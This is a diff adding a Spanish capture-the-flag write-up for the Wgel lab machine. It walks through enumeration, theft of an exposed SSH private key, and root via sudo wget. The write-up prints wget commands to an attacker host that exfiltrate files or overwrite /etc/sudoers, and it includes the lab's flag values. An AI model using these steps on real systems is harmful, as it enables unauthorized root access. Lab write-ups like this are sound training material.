@@ -1,0 +1,187 @@
+---
+layout: default
+---
+
+# Wgel CTF
+
+![Wgel CTF](/imagenes/wgelCTF.png)
+
+---
+
+## Fase 1 — Enumeración
+
+### Fase 1.1 — Nmap Port Scan
+
+**Comando ejecutado:**
+```bash
+nmap -sC -sV -oN wgel_ctf.nmap <TARGET_IP>
+```
+
+**Puertos descubiertos:**
+
+| Puerto | Servicio | Versión |
+|--------|----------|---------|
+| 22/tcp | SSH | OpenSSH 7.2p2 Ubuntu |
+| 80/tcp | HTTP | Apache 2.4.18 Ubuntu |
+
+**Hallazgos:**
+- Título HTTP: **Apache2 Ubuntu Default Page**
+- Solo 2 puertos → superficie de ataque reducida
+
+![fase1.1_nmap_scan.png](fase1.1_nmap_scan.png)
+
+---
+
+### Fase 1.2 — Enumeración Web
+
+**Comando 1 — Gobuster puerto 80:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
+```
+
+**Directorios descubiertos:**
+- `/sitemap` → Status 301
+
+![fase1.2_gobuster_80.png](fase1.2_gobuster_80.png)
+
+---
+
+**Comando 2 — Revisión del código fuente de la página principal:**
+```
+http://<TARGET_IP>
+```
+
+Accedemos a la página principal y revisamos el código fuente con clic derecho → Ver código fuente.
+
+**Hallazgos:**
+- Comentario oculto: `<!--Jessie don't forget to udate the webiste-->`
+- **Usuario identificado: `jessie`**
+
+![fase1.2_index_source.png](fase1.2_index_source.png)
+
+---
+
+**Comando 3 — Gobuster en /sitemap:**
+```bash
+# [MÁQUINA ATACANTE]
+gobuster dir -u http://<TARGET_IP>/sitemap -w /usr/share/wordlists/dirb/common.txt -t 50
+```
+
+**Directorios descubiertos:**
+- `.ssh` → Status 301 — Directorio SSH encontrado
+
+![fase1.2_gobuster_sitemap.png](fase1.2_gobuster_sitemap.png)
+
+---
+
+**Comando 4 — Acceso al directorio .ssh:**
+```
+http://<TARGET_IP>/sitemap/.ssh/
+```
+
+**Hallazgos:**
+- `id_rsa` → Clave privada RSA de jessie expuesta públicamente
+
+![fase1.2_ssh_directory.png](fase1.2_ssh_directory.png)
+
+![fase1.2_id_rsa_web.png](fase1.2_id_rsa_web.png)
+
+---
+
+## Fase 2 — Foothold
+
+### Fase 2.1 — Acceso SSH como jessie
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+wget http://<TARGET_IP>/sitemap/.ssh/id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa jessie@<TARGET_IP>
+```
+
+**Hallazgos:**
+- Acceso exitoso como `jessie` sin contraseña usando la clave privada RSA
+
+![fase2.1_ssh_jessie.png](fase2.1_ssh_jessie.png)
+
+---
+
+### Fase 2.2 — User Flag
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+find / -name "user_flag.txt" 2>/dev/null
+cat /home/jessie/Documents/user_flag.txt
+```
+
+**User Flag:**
+```
+057c67131c3d5e42dd5cd3075b198ff6
+```
+
+![fase2.2_user_flag.png](fase2.2_user_flag.png)
+
+---
+
+## Fase 3 — Escalada de Privilegios
+
+### Fase 3.1 — Identificación del vector PrivEsc (GTFOBins)
+
+Consultamos **GTFOBins** tras identificar con `sudo -l` que jessie puede ejecutar `/usr/bin/wget` como root sin contraseña.
+
+GTFOBins nos indica dos vectores de explotación con wget:
+- **Upload (Sudo):** `wget --post-file=/ruta/archivo http://atacante` → exfiltrar archivos como root
+- **Download (Sudo):** `wget http://atacante/archivo -O /ruta/destino` → sobrescribir archivos como root
+
+![fase3.1_gtfobins_wget_detail.png](fase3.1_gtfobins_wget_detail.png)
+
+![fase3.1_gtfobins_upload.png](fase3.1_gtfobins_upload.png)
+
+![fase3.1_gtfobins_download.png](fase3.1_gtfobins_download.png)
+
+---
+
+### Fase 3.2 — Creación de sudoers malicioso
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA ATACANTE]
+echo "jessie ALL=(ALL) NOPASSWD: ALL" > sudoers
+python3 -m http.server 8080
+```
+
+![fase3.2_python_server.png](fase3.2_python_server.png)
+
+---
+
+### Fase 3.3 — Sobrescritura de /etc/sudoers
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+sudo wget http://<ATTACKER_IP>:8080/sudoers -O /etc/sudoers
+```
+
+![fase3.3_wget_sudoers.png](fase3.3_wget_sudoers.png)
+
+---
+
+### Fase 3.4 — Root Shell y Root Flag
+
+**Comando ejecutado:**
+```bash
+# [MÁQUINA OBJETIVO]
+sudo su
+whoami
+cat /root/root_flag.txt
+```
+
+**Root Flag:**
+```
+b1b968b37519ad1daa6408188649263d
+```
+
+![fase3.4_root_shell.png](fase3.4_root_shell.png)
